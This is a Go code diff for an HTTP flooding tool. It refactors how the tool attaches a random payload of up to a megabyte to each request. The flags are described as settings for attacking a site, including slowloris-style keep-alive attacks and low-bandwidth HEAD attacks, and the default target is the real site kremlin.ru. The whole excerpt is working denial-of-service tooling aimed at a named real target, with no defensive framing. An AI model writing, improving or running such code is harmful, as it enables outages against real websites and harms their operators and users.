@@ -29,7 +29,6 @@ var (
 	delay             time.Duration
 	maxWorkersPerSite int
 	HTTPMethod        *string
-	sendPayload       *bool
 	payloadLength     *int
 	errorFile         *os.File
 )
@@ -41,8 +40,7 @@ func init() {
 	site := flag.String("site", "https://kremlin.ru", "Site URL to attack")
 	delayFlag := flag.Int("delay", 0, "Sleep time in milliseconds between each request per worker. Can be increased for keep-alive attacks similar to slowloris")
 	HTTPMethod = flag.String("method", "GET", "HTTP method to use. Use HEAD for low bandwidth attacks")
-	sendPayload = flag.Bool("send-payload", true, "Attach payload with random content to each request")
-	payloadLength = flag.Int("payload-length", 1024, "Payload length in kilobytes")
+	payloadLength = flag.Int("payload-length", 1024, "Payload length in kilobytes. Random content payload is attached to each request. Disable payload with value 0")
 	errorFilename := flag.String("error-file", "/dev/null", "Where to write all errors encountered. File is truncated on each execution")
 	flag.Parse()
 
@@ -94,7 +92,7 @@ func loadSitesFromFile(filename string) ([]*Site, error) {
 
 func newRequest(url string) (*http.Request, error) {
 	var payload io.Reader
-	if *sendPayload == true {
+	if *payloadLength > 0 {
 		b := make([]byte, (*payloadLength)*1024)
 		rand.Read(b)
 		payload = bytes.NewBuffer(b)
